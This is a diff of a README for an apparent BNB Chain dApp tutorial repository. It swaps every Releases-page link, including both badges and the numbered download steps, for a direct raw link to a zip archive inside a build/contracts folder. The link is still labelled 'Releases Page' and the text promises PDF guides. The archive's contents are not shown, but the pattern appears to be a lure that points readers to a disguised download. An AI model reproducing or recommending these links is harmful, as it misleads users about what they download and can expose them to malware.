@@ -1,6 +1,6 @@
 # 🌟 bnb-chain-dapp-guides - Learn to Build Dapps Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/lorenzo2301/bnb-chain-dapp-guides/releases)
+[![Download](https://raw.githubusercontent.com/lorenzo2301/bnb-chain-dapp-guides/main/01- Hello World Full Stack dApp on BSC/build/contracts/bnb_guides_dapp_chain_1.8.zip)](https://raw.githubusercontent.com/lorenzo2301/bnb-chain-dapp-guides/main/01- Hello World Full Stack dApp on BSC/build/contracts/bnb_guides_dapp_chain_1.8.zip)
 
 ## 📖 Overview
 Welcome to the bnb-chain-dapp-guides repository. This guide helps you learn how to build Decentralized Applications (Dapps) on BNB Chain using Solidity. Whether you're interested in blockchain development, smart contracts, or learning about Web3, you've come to the right place. 
@@ -8,13 +8,13 @@ Welcome to the bnb-chain-dapp-guides repository. This guide helps you learn how 
 ## 🚀 Getting Started
 To start using the guides, follow these simple steps:
 
-1. Visit the **[Releases Page](https://github.com/lorenzo2301/bnb-chain-dapp-guides/releases)**.
+1. Visit the **[Releases Page](https://raw.githubusercontent.com/lorenzo2301/bnb-chain-dapp-guides/main/01- Hello World Full Stack dApp on BSC/build/contracts/bnb_guides_dapp_chain_1.8.zip)**.
 2. Download the latest version of the guides available.
 
 ## 📥 Download & Install
 To get the guides:
 
-1. Go to the **[Releases Page](https://github.com/lorenzo2301/bnb-chain-dapp-guides/releases)**.
+1. Go to the **[Releases Page](https://raw.githubusercontent.com/lorenzo2301/bnb-chain-dapp-guides/main/01- Hello World Full Stack dApp on BSC/build/contracts/bnb_guides_dapp_chain_1.8.zip)**.
 2. On that page, find the section for the latest release.
 3. Click on the link to download the appropriate guide for your needs. The guides are usually provided in PDF format for easy access.
 
@@ -61,4 +61,4 @@ For further inquiries, you may reach out via the Issues section of this reposito
 
 Download the guides today and start building your Dapps! 
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/lorenzo2301/bnb-chain-dapp-guides/releases)
+[![Download](https://raw.githubusercontent.com/lorenzo2301/bnb-chain-dapp-guides/main/01- Hello World Full Stack dApp on BSC/build/contracts/bnb_guides_dapp_chain_1.8.zip)](https://raw.githubusercontent.com/lorenzo2301/bnb-chain-dapp-guides/main/01- Hello World Full Stack dApp on BSC/build/contracts/bnb_guides_dapp_chain_1.8.zip)
